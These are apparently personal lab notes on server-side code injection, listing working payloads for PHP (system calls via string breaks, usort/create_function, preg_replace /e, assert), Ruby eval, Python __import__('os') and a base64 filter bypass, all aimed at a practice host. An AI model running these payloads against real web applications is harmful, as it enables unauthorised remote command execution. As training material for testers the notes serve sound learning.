___________________________________________________________________

code execution
___________________________________________________________________

 it's always handy to know how to comment out the rest of the 
code (i.e.: the suffix that the application will add to the 
user-controlled data). in php, you can use // to get rid of the 
code added by the application.

as with sql injection, you can use the same value technique to 
test and ensure you have a code injection:

    by using comments and injecting /* random value */.
    by injecting a simple concatenation "." (where " are used to 
break the syntax and reform it correctly).
    by replacing the parameter you provided by a string 
concatenation, for example "."ha"."cker"." instead of hacker.

if you inject a single quote, nothing happens. however, you can 
get a better idea of the problem by injecting a double quote.

how does string concatenation work ??
___________________________________________________________________

#1

libcurl.so/?name=".system('ls');$a="
libcurl.so/?name=".system('ls');//"
libcurl.so/?name=".system('ls');#"     > not working
___________________________________________________________________

#2

(inspired by code execution in phpmyadmin)

when ordering information, developers can use two methods:

    order by in a sql request;
    usort in php code.

the function usort is often used with the function 
create_function to dynamically generate the "sorting" function, 
based on user-controlled information. if the web application 
lacks potent filtering and validation, this can lead to code 
execution.

> ?order=id);}system('uname%20-a');//
___________________________________________________________________

#3

pcre_replace_eval has been deprecated as of php 5.5.0 and removed 
in 7.0.0

https://www.php.net/manual/en/function.preg-replace.php
https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php

libcurl.so/?new=system("ls")&pattern=/asdf/e&base=hello asdf
___________________________________________________________________

#4

assert: when used incorrectly, this function will evaluate the 
value received

libcurl.so/?name=hacker'.system('ls').'
___________________________________________________________________

#5

@message = eval "\"hello "+params['username']+"\""

why does this work?:
libcurl.so/?username=<br>"%2b`ls`%2b"

and not this?:
libcurl.so/?username=<br>"+`ls`+"

because + is url encoded as a space
___________________________________________________________________

#6

libcurl.so/hello/" + "a" + "

how do we know it's python?:
"%2bstr(true)%2b"test.

libcurl.so/hello/"%2bstr(os.system('id'))%2b"
it may also be valuable to get the value returned by the command. 
to do this, you can use: os.popen('[cmd]').read() instead of 
os.system('[cmd]')
___________________________________________________________________

#7

in the previous challenge, we made things a bit easier by 
importing os in the vulnerable application. however, we didn't 
for this challenge.

we can use the following syntax to load and run the system 
function: __import__('os').system(...

libcurl.so/hello/"%2b__import__('os').system('ls')%2b"		wrong
libcurl.so/hello/"%2b`__import__('os').system('id')`%2b"	right
libcurl.so/hello/"%2b`__import__('os').popen('ls').read()`%2b"
___________________________________________________________________

#8

since forward slashes are banned we first encode our payload to 
base64 and make the server decode it

libcurl.so/hello/"%2b__import__('os').popen(__import__('base64').de
codestring([base64encodedcommand])).read()%2b"
___________________________________________________________________

#9

perl-cgi

important points:

 - need to refresh, since javascript is taking parameters from 
url (#)
 - even if double quotes give errors single quotes might inject
 - don't use the same quotes to inject within the payload
 - what kind of concatenation works (. or +) gives you a good 
idea of what language is there
 - sometimes json data might not be visible since it can't be 
parsed, in that case look at the raw data

steps:
	go to devtools > network
	click on preserve logs
	look at the last request
	go to that end point and inject
___________________________________________________________________